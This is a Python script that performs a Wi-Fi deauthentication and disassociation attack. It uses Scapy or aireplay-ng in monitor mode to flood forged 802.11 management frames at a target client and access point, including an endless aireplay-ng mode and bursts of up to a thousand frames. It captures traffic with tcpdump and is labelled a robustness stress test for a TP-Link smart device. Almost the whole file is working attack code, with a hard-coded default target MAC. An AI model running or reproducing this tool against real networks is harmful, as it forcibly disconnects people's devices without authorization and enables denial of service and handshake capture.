#!/usr/bin/env python3
# desauth.py
# Run: sudo python3 desauth.py

import sys
import subprocess
import time
import os
import re
import signal
import argparse
import logging
from pathlib import Path

from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
from element import NetworkInfo  # local module

# === Logging ===
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

# === Default parameters ===
DEFAULT_TARGET_MAC = "50:91:E3:1C:9B:E4"
FORCED_CHANNEL = 6
USE_SCAPY = True

BASE_DIR = Path(__file__).resolve().parent
FILE_DIR = BASE_DIR / "desauthcapture"
TCPDUMP_PATH = "/usr/sbin/tcpdump"
TCPDUMP_CAPS = "cap_net_raw,cap_net_admin=eip"
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


# === Exceptions ===
class DeauthError(Exception):
    pass


# === Validation ===
def validate_mac(mac: str, label: str):
    if not MAC_RE.match(mac):
        raise DeauthError(f"Invalid {label} MAC address: '{mac}'")

def validate_channel(channel: int):
    if not (1 <= channel <= 14):
        raise DeauthError(f"Invalid channel: {channel}. Must be between 1 and 14.")


# === Subprocess helper ===
def run(cmd, check=False, capture=False, text=True, timeout=15):
    try:
        return subprocess.run(cmd, check=check, capture_output=capture,
                              text=text, timeout=timeout)
    except subprocess.TimeoutExpired:
        raise DeauthError(f"Command timed out ({timeout}s): {' '.join(cmd)}")
    except subprocess.CalledProcessError as e:
        raise DeauthError(f"Command failed: {' '.join(cmd)}\n{e.stderr or ''}")


# === device_onoff runner ===
def run_device_onoff(cycles: int = 10, device_xy: tuple = (241, 758),
                     toggle_xy: tuple = (890, 940),
                     app: str = "com.tplink.iot"):
    """
    Call device_onoff.py as a subprocess.
    Blocks until the toggle cycles are complete.
    """
    script = BASE_DIR / "device_onoff.py"
    if not script.exists():
        raise DeauthError(f"device_onoff.py not found at {script}")

    cmd = [
        sys.executable, str(script),
        "--app", app,
        "-n", str(cycles),
        "--device", str(device_xy[0]), str(device_xy[1]),
        "--toggle", str(toggle_xy[0]), str(toggle_xy[1]),
    ]

    logger.info(f"[DEVICE] Launching device_onoff.py ({cycles} cycles)...")
    try:
        result = subprocess.run(cmd, timeout=cycles * 5 + 60)
        if result.returncode != 0:
            logger.warning(f"[DEVICE] device_onoff.py exited with code {result.returncode}")
        else:
            logger.info("[DEVICE] device_onoff.py completed successfully.")
    except subprocess.TimeoutExpired:
        logger.warning("[DEVICE] device_onoff.py timed out — continuing stress test.")
    except Exception as e:
        logger.warning(f"[DEVICE] device_onoff.py error: {e}")


# === Capture directory ===
def ensure_capture_dir_owned_by_user():
    FILE_DIR.mkdir(exist_ok=True)
    try:
        st = FILE_DIR.stat()
        if st.st_uid != os.getuid():
            logger.warning(f"'{FILE_DIR}' not owned by current user. Fixing...")
            run(["sudo", "chown", "-R",
                 f"{os.getenv('USER')}:{os.getenv('USER')}", str(FILE_DIR)])
    except Exception:
        logger.warning("Unable to verify capture dir ownership.")


# === tcpdump caps ===
def tcpdump_has_caps() -> bool:
    try:
        res = run(["getcap", TCPDUMP_PATH], capture=True)
        out = (res.stdout or "").strip()
        return "cap_net_raw" in out and "cap_net_admin" in out and "eip" in out
    except Exception:
        return False

def ensure_tcpdump_caps():
    if not os.path.exists(TCPDUMP_PATH):
        logger.error(f"tcpdump not found at {TCPDUMP_PATH}")
        return
    if tcpdump_has_caps():
        logger.info("tcpdump capabilities OK.")
        return
    logger.info(f"Applying setcap to tcpdump...")
    try:
        run(["sudo", "setcap", TCPDUMP_CAPS, TCPDUMP_PATH], check=True)
    except DeauthError as e:
        logger.error(f"setcap failed: {e}")


# === Monitor mode ===
def enable_monitor_mode(interface: str):
    logger.info(f"Enabling monitor mode on {interface}")
    run(["sudo", "airmon-ng", "start", interface])

def disable_monitor_mode(interface_mon: str):
    logger.info(f"Disabling monitor mode on {interface_mon}")
    run(["sudo", "airmon-ng", "stop", interface_mon])

def set_channel(interface_mon: str, channel: int):
    logger.info(f"Setting {interface_mon} to channel {channel}")
    run(["sudo", "iwconfig", interface_mon, "channel", str(channel)])

def wifi_recover(interface: str):
    logger.info("Recovering Wi-Fi...")
    run(["sudo", "ip", "link", "set", interface, "down"])
    run(["sudo", "iw", interface, "set", "type", "managed"])
    run(["sudo", "ip", "link", "set", interface, "up"])
    run(["sudo", "systemctl", "restart", "NetworkManager"])
    run(["sudo", "systemctl", "restart", "wpa_supplicant"])
    run(["nmcli", "radio", "wifi", "off"])
    time.sleep(1)
    run(["nmcli", "radio", "wifi", "on"])


# === pcap ===
def get_next_pcap_name() -> Path:
    FILE_DIR.mkdir(exist_ok=True)
    max_num = 0
    for name in os.listdir(FILE_DIR):
        if not name.startswith("deauth_capture_") or not name.endswith(".pcap"):
            continue
        num_part = name[len("deauth_capture_"):-len(".pcap")]
        if num_part.isdigit():
            max_num = max(max_num, int(num_part))
    return FILE_DIR / f"deauth_capture_{max_num + 1}.pcap"

def start_tcpdump_capture(pcap_file: Path, iface: str, bssid: str = ""):
    logger.info(f"Starting tcpdump → {pcap_file}")
    cmd = ["tcpdump", "-i", iface, "-w", str(pcap_file)]
    if bssid:
        cmd += ["ether", "host", bssid]
    try:
        return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        logger.warning(f"Error starting tcpdump: {e}")
        return None

def stop_tcpdump(proc):
    if not proc or proc.poll() is not None:
        return
    try:
        proc.terminate()
        proc.wait(timeout=5)
        logger.info("tcpdump terminated.")
    except subprocess.TimeoutExpired:
        proc.kill()
        logger.info("tcpdump killed.")
    except Exception as e:
        logger.warning(f"Error stopping tcpdump: {e}")


# === Scapy senders ===
def send_bidirectional_mgmt(pkt_class, reason: int, target_mac: str, ap_mac: str,
                            iface_mon: str, nbr: int = 2, label: str = ""):
    logger.info(f"Sending {2 * nbr} bidirectional {label or 'mgmt'} packets via {iface_mon}")
    pkt_ap  = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac,    addr3=ap_mac)    / pkt_class(reason=reason)
    pkt_cli = RadioTap() / Dot11(addr1=ap_mac,     addr2=target_mac, addr3=target_mac) / pkt_class(reason=reason)
    try:
        t0 = time.time()
        for _ in range(nbr):
            sendp(pkt_ap,  iface=iface_mon, verbose=0)
            sendp(pkt_cli, iface=iface_mon, verbose=0)
        logger.info(f"{2 * nbr} packets sent in {time.time() - t0:.2f}s")
    except KeyboardInterrupt:
        logger.info("Attack stopped by user.")

def send_deauth_packets(target_mac, ap_mac, iface_mon, nbr=2):
    send_bidirectional_mgmt(Dot11Deauth, 7, target_mac, ap_mac, iface_mon, nbr, "Deauth")

def send_disassoc_packets(target_mac, ap_mac, iface_mon, nbr=2):
    send_bidirectional_mgmt(Dot11Disas,  8, target_mac, ap_mac, iface_mon, nbr, "Disassociation")


# === aireplay-ng ===
def launch_aireplay_deauth(iface_mon: str, target_mac: str, ap_mac: str):
    logger.info("Launching aireplay-ng (Ctrl+C to stop)")
    proc = None
    try:
        proc = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "0",
             "-c", target_mac, "-a", ap_mac, iface_mon],
            preexec_fn=os.setsid
        )
        proc.wait()
    except KeyboardInterrupt:
        logger.info("Stopping aireplay-ng...")
        if proc and proc.poll() is None:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)


# =============================================================
# STRESS TEST  —  deauth → device_onoff → deauth
# =============================================================
def stress_test(target_mac: str, ap_mac: str, iface_mon: str,
                no_disassoc: bool, device_cycles: int,
                device_xy: tuple, toggle_xy: tuple, app: str):

    logger.info("=" * 55)
    logger.info("STRESS TEST START")
    logger.info("  Phase 1 → Deauth burst (100 iterations)")
    logger.info("  Phase 2 → device_onoff toggle cycles")
    logger.info("  Phase 2+3 → device_onoff + Deauth burst en parallèle")
    logger.info("=" * 55)

    # ── Phase 1 : deauth ──────────────────────────────────────
    logger.info("[PHASE 1] Sending deauth packets...")
    send_deauth_packets(target_mac, ap_mac, iface_mon, nbr=100)
    if not no_disassoc:
        send_disassoc_packets(target_mac, ap_mac, iface_mon, nbr=100)

    logger.info("[PHASE 1] Done. Waiting 5s before toggling device...")
    time.sleep(5)

    # ── Phase 2 & 3 : device_onoff + deauth en parallèle ─────
    import threading

    logger.info("[PHASE 2+3] Starting device_onoff.py AND deauth simultaneously...")

    def phase3_deauth():
        send_deauth_packets(target_mac, ap_mac, iface_mon, nbr=100)
        if not no_disassoc:
            send_disassoc_packets(target_mac, ap_mac, iface_mon, nbr=100)
        logger.info("[PHASE 3] Deauth thread done.")

    deauth_thread = threading.Thread(target=phase3_deauth, daemon=True)
    deauth_thread.start()

    run_device_onoff(cycles=device_cycles, device_xy=device_xy,
                     toggle_xy=toggle_xy, app=app)
    logger.info("[PHASE 2] device_onoff.py done.")

    deauth_thread.join()
    logger.info("[PHASE 2+3] Both threads completed.")

    logger.info("[PHASE 2+3] Done.")
    logger.info("=" * 55)
    logger.info("STRESS TEST COMPLETE")
    logger.info("=" * 55)


# === Main ===
if __name__ == "__main__":
    info = NetworkInfo.get_wireless_interface_details()

    if not info["interface"] or not info["gateway_mac"]:
        logger.error("No valid Wi-Fi interface or gateway MAC detected.")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description="Wi-Fi deauth/disassoc + device robustness stress test"
    )
    parser.add_argument("-i", "--interface", default=info["interface"])
    parser.add_argument("-t", "--target",    default=DEFAULT_TARGET_MAC)
    parser.add_argument("-a", "--ap",        default=info["gateway_mac"])
    parser.add_argument("-n", "--count",     type=int, default=1000)
    parser.add_argument("--channel",         type=int, default=FORCED_CHANNEL)
    parser.add_argument("--no-disassoc",     action="store_true")
    parser.add_argument("--capture-ap",      action="store_true")

    # device_onoff options
    parser.add_argument("--app",             default="com.tplink.iot",
                        help="Android app package (passed to device_onoff.py)")
    parser.add_argument("--device-cycles",   type=int, default=10,
                        help="Toggle cycles for device_onoff.py (default: 10)")
    parser.add_argument("--device-xy",       nargs=2, type=int, default=[241, 758],
                        metavar=("X", "Y"), help="Device tap coordinates")
    parser.add_argument("--toggle-xy",       nargs=2, type=int, default=[890, 940],
                        metavar=("X", "Y"), help="Toggle tap coordinates")

    # mode
    parser.add_argument("--stress",          action="store_true",
                        help="Run stress test: deauth → device_onoff → deauth")

    args = parser.parse_args()

    try:
        validate_mac(args.target, "target")
        validate_mac(args.ap, "AP")
        validate_channel(args.channel)
    except DeauthError as e:
        logger.error(str(e))
        sys.exit(1)

    interface  = args.interface
    target_mac = args.target
    ap_mac     = args.ap
    iface_mon  = interface + "mon"

    logger.info("Configuration:")
    logger.info(f"  Interface   : {interface}")
    logger.info(f"  Target MAC  : {target_mac}")
    logger.info(f"  AP MAC      : {ap_mac}")
    logger.info(f"  Channel     : {args.channel}")
    logger.info(f"  Mode        : {'STRESS TEST' if args.stress else ('SCAPY' if USE_SCAPY else 'AIREPLAY-NG')}")
    logger.info(f"  Disassoc    : {'NO' if args.no_disassoc else 'YES'}")
    if args.stress:
        logger.info(f"  Device app  : {args.app}")
        logger.info(f"  Dev cycles  : {args.device_cycles}")

    ensure_capture_dir_owned_by_user()
    ensure_tcpdump_caps()
    pcap_file    = get_next_pcap_name()
    tcpdump_proc = None

    try:
        enable_monitor_mode(interface)
        set_channel(iface_mon, args.channel)

        tcpdump_proc = start_tcpdump_capture(
            pcap_file, iface_mon,
            ap_mac if args.capture_ap else ""
        )

        if args.stress:
            # ── Stress test mode ──────────────────────────────
            stress_test(
                target_mac   = target_mac,
                ap_mac       = ap_mac,
                iface_mon    = iface_mon,
                no_disassoc  = args.no_disassoc,
                device_cycles= args.device_cycles,
                device_xy    = tuple(args.device_xy),
                toggle_xy    = tuple(args.toggle_xy),
                app          = args.app,
            )

        elif USE_SCAPY:
            # ── Normal Scapy mode ─────────────────────────────
            send_deauth_packets(target_mac, ap_mac, iface_mon, nbr=2)
            if not args.no_disassoc:
                send_disassoc_packets(target_mac, ap_mac, iface_mon, nbr=2)
            time.sleep(20)
            send_deauth_packets(target_mac, ap_mac, iface_mon, nbr=args.count)
            if not args.no_disassoc:
                send_disassoc_packets(target_mac, ap_mac, iface_mon, nbr=args.count)
            time.sleep(20)

        else:
            # ── aireplay-ng mode ──────────────────────────────
            launch_aireplay_deauth(iface_mon, target_mac, ap_mac)

    except DeauthError as e:
        logger.error(str(e))

    except KeyboardInterrupt:
        logger.info("Interrupted by user.")

    finally:
        stop_tcpdump(tcpdump_proc)
        disable_monitor_mode(iface_mon)
        wifi_recover(interface)